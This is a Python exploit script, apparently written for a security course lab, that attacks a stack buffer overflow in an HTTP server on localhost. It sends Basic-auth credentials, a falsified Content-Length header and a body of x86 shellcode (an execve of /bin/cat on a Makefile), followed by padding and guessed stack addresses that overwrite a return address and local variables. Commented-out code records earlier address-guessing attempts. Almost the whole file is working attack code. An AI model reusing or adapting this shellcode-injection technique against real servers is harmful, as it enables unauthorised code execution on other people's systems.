# import requests
# import base64


url = "http://localhost:8000/"

# payl = "test" + ":" + "029794db6e76cb559613732d7c94b24b360bb6f05879bb99e7765518b55abc57"
# headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8"),'Content-Length': '2'}
# payload = {'test': 'value1', 'key2': 'value2'}



# response = requests.post(url,headers = headers,data="h2")

# print(response.status_code)
# print(response.headers)
# print(response.text)

from requests import Request, Session
import base64
import time


pas="test:029794db6e76cb559613732d7c94b24b360bb6f05879bb99e7765518b55abc57"

def transform_address(address):

	mybytes= address.to_bytes(4, byteorder='little')
	mystring = ""
	for b in mybytes:
		mystring += '%c' % int(b)
	
	return mystring

#b = b'15' "\x15"



# guessed 0xffad4d20
# 0xFFAD4D7C

#9D19CA00


guessed_address=0xffa15788 - 0xB8
var_c0_value = 0x3081c026

print(hex(guessed_address))
shellcode="\xEB\x29\x5E\x31\xC0\x88\x46\x08\x88\x46\x11\x89\x76\x12\x89\xF2\x83\xC2\x09\x89\x56\x16\x89\x46\x1A\xB0\x0B\x89\xF3\x8D\x4E\x12\x31\xD2\xCD\x80\x31\xC0\x40\x31\xDB\xCD\x80\xE8\xD2\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x63\x61\x74\x58\x4D\x61\x6B\x65\x66\x69\x6C\x65\x01"

# address_of_c = guessed_address + 132#size of final data
# data = shellcode + 26*"!"+ transform_address(guessed_address+132+38) + 8*"!" +"\xFF\xFF\xFF\xFF"+ transform_address(address_of_c) + 5*transform_address(guessed_address)

data = shellcode + 26*"!" +transform_address(guessed_address + 140 + 4) + 8*"!" + 4*"-" + 4*"-"+4*"!"+transform_address(guessed_address + 124) + 4*"-" + transform_address(var_c0_value)+12*"!" + transform_address(guessed_address) + '\0'



#66 + 38 + 4 + 4 + 5*4 = 132
s = Session()

req = Request('POST', url, data=data)

prepped = req.prepare()
prepped.headers['Content-Length'] = len(shellcode) 
prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
response = s.send(prepped)


print(response.status_code)
print(response.headers)
print(response.content)





# for i in range(20):
# 	s = Session()
# 	mystr = 42*"!"
# 	address_of_c = 



# 	# addr = "\x20\xce\x70\xff"
# 	req = Request('POST', url, data="" + mystr +addr)

# 	prepped = req.prepare()
# 	prepped.headers['Content-Length'] = '66' 
# 	prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
# 	response = s.send(prepped)


# 	print(response.status_code)
# 	print(response.headers)
# 	print(response.content)
# 	time.sleep(1)



	#FFC5B138


	#TODO: overwrite char*c with an address containing '\0' so that the loop terminates immedately                   
	# section .data
    #	null_char db 0
	# mov eax, null_char
	# mov [c], eax

	#	   overwrite char*name with FFFFFFF
	# mov eax, 0xFFFFFFFF
    # mov [name], eax
	
	#	   guess the buffer address

